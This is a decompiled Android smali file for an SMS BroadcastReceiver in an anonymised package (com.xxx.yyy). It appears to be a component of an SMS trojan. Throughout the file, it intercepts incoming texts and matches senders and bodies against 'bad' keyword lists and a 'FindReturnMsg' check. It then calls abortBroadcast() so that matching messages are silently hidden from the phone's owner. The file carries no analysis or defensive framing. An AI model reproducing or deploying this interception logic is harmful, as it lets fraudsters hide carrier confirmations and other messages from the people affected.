.class public Lcom/xxx/yyy/MessageReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MessageReceiver.java"


# static fields
.field static final ACTION:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# instance fields
.field smshandler:Lcom/xxx/yyy/SmsGetHandler;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 12
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/xxx/yyy/MessageReceiver;->smshandler:Lcom/xxx/yyy/SmsGetHandler;

    .line 9
    return-void
.end method

.method private Checksms(Lcom/xxx/yyy/SmsGetHandler;Landroid/telephony/gsm/SmsMessage;)Z
    .locals 7
    .parameter "h"
    .parameter "sms"

    .prologue
    const/4 v6, 0x1

    .line 63
    invoke-virtual {p2}, Landroid/telephony/gsm/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v2

    .line 64
    .local v2, from:Ljava/lang/String;
    invoke-virtual {p2}, Landroid/telephony/gsm/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v0

    .line 65
    .local v0, body:Ljava/lang/String;
    const/4 v1, 0x0

    .line 66
    .local v1, find:Z
    iget-object v4, p1, Lcom/xxx/yyy/SmsGetHandler;->filterMdnList:Ljava/util/List;

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_2

    .line 74
    iget-object v4, p1, Lcom/xxx/yyy/SmsGetHandler;->filterKeyList:Ljava/util/List;

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_3

    .line 82
    invoke-virtual {p1, v2, v0}, Lcom/xxx/yyy/SmsGetHandler;->FindReturnMsg(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    move v4, v1

    .line 83
    :goto_0
    return v4

    .line 66
    :cond_2
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/xxx/yyy/SMSEntityBad;

    .line 70
    .local v3, smsEntityBad:Lcom/xxx/yyy/SMSEntityBad;
    invoke-virtual {v3}, Lcom/xxx/yyy/SMSEntityBad;->getKeyWord()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v4, v6

    .line 71
    goto :goto_0

    .line 74
    .end local v3           #smsEntityBad:Lcom/xxx/yyy/SMSEntityBad;
    :cond_3
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/xxx/yyy/SMSEntityBad;

    .line 78
    .restart local v3       #smsEntityBad:Lcom/xxx/yyy/SMSEntityBad;
    invoke-virtual {v3}, Lcom/xxx/yyy/SMSEntityBad;->getKeyWord()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    move v4, v6

    .line 79
    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9
    .parameter "ct"
    .parameter "paramIntent"

    .prologue
    .line 16
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v7

    const-string v8, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 20
    new-instance v7, Lcom/xxx/yyy/SmsGetHandler;

    invoke-direct {v7, p1}, Lcom/xxx/yyy/SmsGetHandler;-><init>(Landroid/content/Context;)V

    iput-object v7, p0, Lcom/xxx/yyy/MessageReceiver;->smshandler:Lcom/xxx/yyy/SmsGetHandler;

    .line 22
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v5

    .line 24
    .local v5, localBundle:Landroid/os/Bundle;
    if-eqz v5, :cond_0

    .line 26
    const-string v7, "pdus"

    invoke-virtual {v5, v7}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    .line 27
    .local v0, arrayOfObject:[Ljava/lang/Object;
    if-eqz v0, :cond_0

    .line 29
    array-length v7, v0

    new-array v1, v7, [Landroid/telephony/gsm/SmsMessage;

    .line 32
    .local v1, arrayOfSmsMessage:[Landroid/telephony/gsm/SmsMessage;
    const/4 v2, 0x0

    .line 33
    .local v2, i:I
    const/4 v4, 0x0

    .line 36
    .local v4, k:I
    :goto_0
    array-length v3, v0

    .line 37
    .local v3, j:I
    if-lt v2, v3, :cond_1

    .line 53
    if-lez v4, :cond_0

    .line 55
    invoke-virtual {p0}, Lcom/xxx/yyy/MessageReceiver;->abortBroadcast()V

    .line 60
    .end local v0           #arrayOfObject:[Ljava/lang/Object;
    .end local v1           #arrayOfSmsMessage:[Landroid/telephony/gsm/SmsMessage;
    .end local v2           #i:I
    .end local v3           #j:I
    .end local v4           #k:I
    .end local v5           #localBundle:Landroid/os/Bundle;
    :cond_0
    return-void

    .line 39
    .restart local v0       #arrayOfObject:[Ljava/lang/Object;
    .restart local v1       #arrayOfSmsMessage:[Landroid/telephony/gsm/SmsMessage;
    .restart local v2       #i:I
    .restart local v3       #j:I
    .restart local v4       #k:I
    .restart local v5       #localBundle:Landroid/os/Bundle;
    :cond_1
    aget-object v7, v0, v2

    check-cast v7, [B

    invoke-static {v7}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v6

    .line 40
    .local v6, localSmsMessage:Landroid/telephony/gsm/SmsMessage;
    aput-object v6, v1, v2

    .line 49
    iget-object v7, p0, Lcom/xxx/yyy/MessageReceiver;->smshandler:Lcom/xxx/yyy/SmsGetHandler;

    invoke-direct {p0, v7, v6}, Lcom/xxx/yyy/MessageReceiver;->Checksms(Lcom/xxx/yyy/SmsGetHandler;Landroid/telephony/gsm/SmsMessage;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 50
    add-int/lit8 v4, v4, 0x1

    .line 51
    :cond_2
    add-int/lit8 v2, v2, 0x1

    .line 34
    goto :goto_0
.end method
